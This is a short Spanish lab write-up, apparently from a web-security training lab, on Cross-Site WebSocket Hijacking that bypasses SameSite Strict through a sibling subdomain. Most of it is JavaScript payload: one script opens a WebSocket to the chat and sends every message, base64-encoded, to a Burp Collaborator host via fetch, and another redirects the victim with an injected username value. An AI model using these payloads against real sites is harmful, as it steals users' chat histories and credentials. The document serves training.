# Bypass de SameSite Strict con dominio hermano 

Tags: #CSRF #BurpSuite #XSRF   #XSS #WebSocket 

```bash 
En este lab se llevará a cabo un ataque de Cross-Site WebSocket Hijacking (CSWSH) para obtener el historial de chat de una víctima, el cual incluye su usuario y contraseña en texto claro.


- WebSocket: Es una tecnología que porporciona un canal de comunicación bidireccional y full-duplex sobre el único socket TCP. Se puede ver la data enviada por el chat desde el historial de 'WebSockets' en BurpSuite 

- AccessControlAllowOrigin: Indica si los recursos de la respuesta pueden ser compartidos con el origen dado. 


Notas:
	1. Se necesita el 'Collaborator' del Pro 
```

```javascript 
// Se puede ver el contenido del chat de el Collaborator al hacer 'Pull'

<script>
	var ws = new WebSocket("https://web.com/chat");
	ws.onopen = function(){
		ws.send("READY");
	};
	ws.onmessage = function(info){
		fetch("https://BurpSuiteCollaborator.com/?data=" + btoa(info.data));
	};
</script>

// Colocar de nuevo este script pero en el subdominio encontrado en el campo 'username' 
```

```javascript 
// Almacenarlo y enviarlo a la víctima 
<script>
	location="https://web.com/login_username=valor_obtenido_de_la_pagina_con_el_script_de_arriba&password=123";
</script>
```